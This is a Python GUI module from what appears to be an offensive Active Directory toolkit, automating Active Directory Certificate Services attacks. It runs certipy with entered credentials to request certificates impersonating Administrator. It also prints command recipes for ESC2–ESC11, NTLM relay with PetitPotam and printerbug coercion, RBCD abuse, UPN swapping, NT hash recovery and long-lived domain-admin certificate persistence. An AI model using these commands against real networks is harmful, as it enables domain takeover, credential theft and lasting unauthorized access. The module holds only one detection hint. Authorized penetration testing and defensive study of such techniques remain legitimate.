# language: Python, file: modules/adcs.py
# ADCS exploitation — ESC1 through ESC8 + certificate theft + persistence
import customtkinter as ctk
import threading
import subprocess
import os
import re
import time
from utils.progress import ProgressTracker


class ADCSModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "adcs"
        self.progress = ProgressTracker(log_queue)
        self.ca_name = ""
        self.ca_host = ""
        self.domain = ""
        self.username = ""
        self.password = ""
        self.template = ""

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="ADCS EXPLOITATION",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="ESC1–ESC8 · certificate theft · NTLM relay to ADCS · persistence",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        # ---- creds ----
        cred = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cred.pack(fill="x", padx=24)
        r1 = ctk.CTkFrame(cred, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=8)

        self.domain_e = ctk.CTkEntry(r1, placeholder_text="domain",
                                     width=180, height=32,
                                     fg_color="#05080c", border_color="#1a2332")
        self.domain_e.pack(side="left", padx=(0, 6))
        self.user_e = ctk.CTkEntry(r1, placeholder_text="username",
                                   width=160, height=32,
                                   fg_color="#05080c", border_color="#1a2332")
        self.user_e.pack(side="left", padx=(0, 6))
        self.pass_e = ctk.CTkEntry(r1, placeholder_text="password",
                                   width=180, height=32, show="*",
                                   fg_color="#05080c", border_color="#1a2332")
        self.pass_e.pack(side="left", padx=(0, 6))
        self.ca_e = ctk.CTkEntry(r1, placeholder_text="CA host (dc.corp.local)",
                                 width=200, height=32,
                                 fg_color="#05080c", border_color="#1a2332")
        self.ca_e.pack(side="left", padx=(0, 6))
        self.ca_name_e = ctk.CTkEntry(r1, placeholder_text="CA name",
                                      width=160, height=32,
                                      fg_color="#05080c", border_color="#1a2332")
        self.ca_name_e.pack(side="left")

        r2 = ctk.CTkFrame(cred, fg_color="transparent")
        r2.pack(fill="x", padx=12, pady=(0, 10))
        ctk.CTkButton(r2, text="▸ SAVE", width=100, height=30,
                      fg_color="#0d2818", hover_color="#1a4a2e",
                      text_color="#00ff9c", command=self._save).pack(side="left", padx=(0, 6))
        ctk.CTkButton(r2, text="▸ FIND CA", width=110, height=30,
                      fg_color="#141a22", hover_color="#1a2332",
                      command=self._find_ca).pack(side="left", padx=(0, 6))
        ctk.CTkButton(r2, text="▸ ENUM TEMPLATES", width=160, height=30,
                      fg_color="#141a22", hover_color="#1a2332",
                      command=self._enum_templates).pack(side="left")

        # ---- attacks ----
        ctk.CTkLabel(parent, text="ESC attacks:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")

        atk = ctk.CTkFrame(parent, fg_color="transparent")
        atk.pack(fill="x", padx=24)

        actions = [
            ("☢ Certipy Find", self._certipy_find),
            ("☢ ESC1 (enrollee supplies SAN)", self._esc1),
            ("☢ ESC2 (any purpose)", self._esc2),
            ("☢ ESC3 (enrollment agent)", self._esc3),
            ("☢ ESC4 (vuln template ACL)", self._esc4),
            ("☢ ESC5 (vuln PKI object ACL)", self._esc5),
            ("☢ ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)", self._esc6),
            ("☢ ESC7 (vuln CA ACL)", self._esc7),
            ("☢ ESC8 (NTLM relay to HTTP)", self._esc8),
            ("☢ ESC9 (no security extension)", self._esc9),
            ("☢ ESC10 (weak cert mapping)", self._esc10),
            ("☢ ESC11 (relay to ICPR)", self._esc11),
            ("☢ Request cert as user", self._request_cert),
            ("☢ PKINIT → TGT", self._pkinit),
            ("☢ UnPAC the hash", self._unpac),
            ("☢ Persist via cert", self._persist_cert),
        ]
        for i, (label, fn) in enumerate(actions):
            ctk.CTkButton(
                atk, text=label, width=230, height=34,
                fg_color="#141a22", hover_color="#1a2332",
                font=ctk.CTkFont(size=11), command=fn
            ).grid(row=i // 4, column=i % 4, padx=4, pady=4)

        # ---- progress ----
        self.bars = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        self.bars.pack(fill="x", padx=24, pady=(12, 0))

        # ---- output ----
        ctk.CTkLabel(parent, text="Findings:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=200
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

        self._poll_bars()

    def _poll_bars(self):
        for w in self.bars.winfo_children():
            w.destroy()
        for tid, t in list(self.progress.snapshot().items())[:5]:
            row = ctk.CTkFrame(self.bars, fg_color="transparent")
            row.pack(fill="x", padx=8, pady=2)
            ctk.CTkLabel(row, text=t["label"][:45], width=300, anchor="w",
                         font=ctk.CTkFont(size=10),
                         text_color="#c8d6e5").pack(side="left")
            b = ctk.CTkProgressBar(row, width=200, height=10,
                                   progress_color="#00ff9c")
            if t["total"]:
                b.set(min(t["current"]/t["total"], 1.0))
            else:
                b.set(0.5 if t["status"] == "running" else 1.0)
            b.pack(side="left", padx=(0, 8))
            ctk.CTkLabel(row, text=t.get("detail", "")[:50],
                         font=ctk.CTkFont(size=9),
                         text_color="#4a5568").pack(side="left")
        self.bars.after(500, self._poll_bars)

    def _save(self):
        self.domain = self.domain_e.get().strip()
        self.username = self.user_e.get().strip()
        self.password = self.pass_e.get().strip()
        self.ca_host = self.ca_e.get().strip()
        self.ca_name = self.ca_name_e.get().strip()
        self.log.put(f"[adcs] creds saved: {self.domain}\\{self.username}@{self.ca_host}")

    def _out(self, text):
        self.out.insert("end", text + "\n")
        self.out.see("end")

    def _run(self, cmd, tag="adcs", tid=None):
        self.log.put(f"[adcs] {' '.join(cmd) if isinstance(cmd, list) else cmd}")
        try:
            p = subprocess.Popen(cmd, shell=isinstance(cmd, str),
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in p.stdout:
                self._out(line.rstrip())
                self.log.put(f"[{tag}] {line.rstrip()}")
                if tid:
                    self.progress.update(tid, increment=1)
            p.wait()
        except FileNotFoundError as e:
            self.log.put(f"[adcs] missing: {e.filename}")

    # ==================== discovery ====================
    def _find_ca(self):
        self._save()
        tid = f"findca-{int(time.time())}"
        self.progress.start(tid, "Finding CAs")
        # certipy find is the modern tool
        cmd = ["certipy", "find",
               "-u", f"{self.username}@{self.domain}",
               "-p", self.password,
               "-dc-ip", self.ca_host,
               "-vulnerable", "-enabled"]
        threading.Thread(target=self._run, args=(cmd, "adcs", tid), daemon=True).start()

    def _enum_templates(self):
        self._save()
        tid = f"enumt-{int(time.time())}"
        self.progress.start(tid, "Enumerating templates")
        cmd = ["certipy", "find",
               "-u", f"{self.username}@{self.domain}",
               "-p", self.password,
               "-dc-ip", self.ca_host,
               "-vulnerable", "-stdout"]
        threading.Thread(target=self._run, args=(cmd, "adcs", tid), daemon=True).start()

    def _certipy_find(self):
        self._find_ca()

    # ==================== ESC1 ====================
    def _esc1(self):
        """Enrollee supplies subject + Client Auth EKU + no manager approval"""
        self._save()
        self._out("\n=== ESC1: enrollee supplies SAN ===\n")
        template = self._ask("template name")
        if not template:
            return
        target_user = self._ask("target user (e.g. Administrator)") or "Administrator"

        tid = f"esc1-{int(time.time())}"
        self.progress.start(tid, f"ESC1 {template}")

        # request cert with SAN=target_user
        cmd = ["certipy", "req",
               "-u", f"{self.username}@{self.domain}",
               "-p", self.password,
               "-ca", f"{self.ca_name}\\{self.ca_host}",
               "-template", template,
               "-upn", f"{target_user}@{self.domain}",
               "-dc-ip", self.ca_host,
               "-out", f"/tmp/esc1_{target_user}.pfx"]
        threading.Thread(target=self._run, args=(cmd, "esc1", tid), daemon=True).start()

        # auto auth after
        self.log.put("[esc1] after PFX: certipy auth -pfx /tmp/esc1_<user>.pfx -dc-ip <dc>")

    # ==================== ESC2 ====================
    def _esc2(self):
        """Template with Any Purpose EKU or no EKU"""
        self._out("""
=== ESC2: Any Purpose EKU ===
Any Purpose EKU = subordinate CA cert for the domain.

1. certipy req -u user@domain -p pass -ca CA\\host -template VulnTemplate -dc-ip dc_ip
2. certipy req -u user@domain -p pass -ca CA\\host -template User -on-behalf-of domain\\Administrator -pfx esc2.pfx
3. certipy auth -pfx esc2.pfx -dc-ip dc_ip
""")

    # ==================== ESC3 ====================
    def _esc3(self):
        """Enrollment Agent template abuse"""
        self._out("""
=== ESC3: Enrollment Agent ===
Template with Certificate Request Agent EKU lets you enroll on behalf of anyone.

1. Get enrollment agent cert:
   certipy req -u user@domain -p pass -ca CA\\host -template EnrollmentAgent -dc-ip dc_ip
2. Request on behalf of DA:
   certipy req -u user@domain -p pass -ca CA\\host -template User -on-behalf-of corp\\Administrator -pfx agent.pfx -dc-ip dc_ip
3. Auth:
   certipy auth -pfx administrator.pfx -dc-ip dc_ip
""")

    # ==================== ESC4 ====================
    def _esc4(self):
        """Template ACL vulnerable — we can modify the template to be ESC1"""
        self._save()
        template = self._ask("template name")
        if not template:
            return
        tid = f"esc4-{int(time.time())}"
        self.progress.start(tid, f"ESC4 {template}")

        # step 1: save original
        self.log.put(f"[esc4] step1: backup {template}")
        # step 2: overwrite with ESC1 config
        self.log.put(f"[esc4] step2: make template ESC1-vulnerable")
        self.log.put("[esc4] use certipy template -template <name> -save-old")
        self.log.put("[esc4] then certipy template -template <name> -write-default-configuration")

        self._out(f"""
=== ESC4: writable template ACL → ESC1 ===
Template: {template}

1. certipy template -u {self.username}@{self.domain} -p <pass> -template {template} -save-old -dc-ip {self.ca_host}
2. certipy template -u {self.username}@{self.domain} -p <pass> -template {template} -write-default-configuration -dc-ip {self.ca_host}
3. Now run ESC1 against {template}
4. Restore: certipy template -u ... -template {template} -configuration <saved.json> -dc-ip {self.ca_host}
""")

    # ==================== ESC5 ====================
    def _esc5(self):
        """Vulnerable PKI object ACL — CA computer object, CA server, etc."""
        self._out("""
=== ESC5: Vulnerable PKI Object ACL ===
If you have write access to:
- CA server's computer object → RBCD → local admin on CA → export CA key
- NTAuthCertificates object → forge certs
- CA's RPC/DCOM → dcsync

Enumerate:
  certipy find -u user -p pass -dc-ip dc -vulnerable
  bloodhound: MATCH (n)-[:WriteDacl|Owns|GenericAll]->(m:CertTemplate)

Exploit RBCD on CA:
  impacket-addcomputer
  impacket-rbcd -delegate-to CA$ -delegate-from ATTACKER$ -action write
  impacket-getST -spn cifs/CA -impersonate Administrator
""")

    # ==================== ESC6 ====================
    def _esc6(self):
        """EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA"""
        self._save()
        tid = f"esc6-{int(time.time())}"
        self.progress.start(tid, "ESC6")
        self._out("""
=== ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 ===
CA flag allows SAN in ANY template request.

certipy req -u user@domain -p pass -ca CA\\host -template User -upn admin@domain -dc-ip dc
certipy auth -pfx admin.pfx -dc-ip dc
""")

    # ==================== ESC7 ====================
    def _esc7(self):
        """CA ACL vulnerable — ManageCA or ManageCertificates"""
        self._out("""
=== ESC7: Vulnerable CA ACL ===
Requires ManageCA or ManageCertificates right on CA.

1. Add yourself as officer:
   certipy ca -u user@domain -p pass -ca CA\\host -add-officer user -dc-ip dc
2. Enable SubCA template:
   certipy ca -u user@domain -p pass -ca CA\\host -enable-template SubCA -dc-ip dc
3. Request SubCA cert (will be denied but req_id saved):
   certipy req -u user@domain -p pass -ca CA\\host -template SubCA -upn admin@domain -dc-ip dc
4. Issue the denied request:
   certipy ca -u user@domain -p pass -ca CA\\host -issue-request <id> -dc-ip dc
5. Retrieve:
   certipy req -u user@domain -p pass -ca CA\\host -retrieve <id> -dc-ip dc
""")

    # ==================== ESC8 ====================
    def _esc8(self):
        """NTLM relay to ADCS HTTP enrollment endpoint"""
        self._save()
        self._out("""
=== ESC8: NTLM Relay → ADCS HTTP ===

Terminal 1 — start relay:
  ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

Terminal 2 — coerce DC auth:
  PetitPotam.py <attacker_ip> <DC_ip>
  # OR
  printerbug.py domain/user:pass@DC attacker_ip

Terminal 3 — auth with base64 cert:
  certipy auth -pfx <cert>.pfx -dc-ip <dc>
""")

    # ==================== ESC9/10/11 ====================
    def _esc9(self):
        self._out("""
=== ESC9: no security extension (szOID_NTDS_CA_SECURITY_EXT) ===
1. Change target user's UPN to attacker's:
   certipy account update -u user -p pass -user victim -upn attacker -dc-ip dc
2. Request cert with attacker UPN
3. Restore victim UPN
4. Auth → get victim hash
""")

    def _esc10(self):
        self._out("""
=== ESC10: weak certificate mapping ===
Registry: StrongCertificateBindingEnforcement = 0/1

Flow: same as ESC9 but abuse weak mapping after UPN swap.
""")

    def _esc11(self):
        self._out("""
=== ESC11: relay to ICPR (RPC) ===
CA has IF_ENFORCEENCRYPTICERTREQUEST disabled.

ntlmrelayx.py -t rpc://<CA> -rpc-mode ICPR -icpr-ca-name <CA> -smb2support
""")

    # ==================== request + auth ====================
    def _request_cert(self):
        self._save()
        template = self._ask("template (e.g. User)") or "User"
        upn = self._ask("UPN (blank = self)") or f"{self.username}@{self.domain}"
        outfile = f"/tmp/cert_{int(time.time())}.pfx"
        cmd = ["certipy", "req",
               "-u", f"{self.username}@{self.domain}",
               "-p", self.password,
               "-ca", f"{self.ca_name}\\{self.ca_host}",
               "-template", template,
               "-upn", upn,
               "-dc-ip", self.ca_host,
               "-out", outfile]
        threading.Thread(target=self._run, args=(cmd,), daemon=True).start()

    def _pkinit(self):
        pfx = self._ask("PFX path")
        if not pfx:
            return
        tid = f"pkinit-{int(time.time())}"
        self.progress.start(tid, "PKINIT → TGT")
        cmd = ["certipy", "auth", "-pfx", pfx, "-dc-ip", self.ca_host]
        threading.Thread(target=self._run, args=(cmd, "pkinit", tid), daemon=True).start()

    def _unpac(self):
        """get NT hash from cert via U2U or PKINIT + UnPAC"""
        pfx = self._ask("PFX path")
        if not pfx:
            return
        cmd = ["certipy", "auth", "-pfx", pfx, "-dc-ip", self.ca_host, "-ldap-shell"]
        threading.Thread(target=self._run, args=(cmd,), daemon=True).start()

    def _persist_cert(self):
        self._out("""
=== Certificate Persistence ===
Certs valid until 2036+ — survive password resets, reboots, GPO changes.

1. Request long-validity cert for DA (ESC1):
   certipy req -u user@domain -p pass -ca CA\\host -template DomainController -upn da@domain -dc-ip dc
2. Store PFX offline
3. Use anytime: certipy auth -pfx da.pfx -dc-ip dc
4. Detect: monitor 4768 for PKINIT where account has no valid smartcard
5. Revoke: only via CA console, need CA private key or ManageCA right
""")

    def _ask(self, prompt):
        # small dialog helper
        import tkinter.simpledialog as sd
        return sd.askstring("ADCS", prompt)
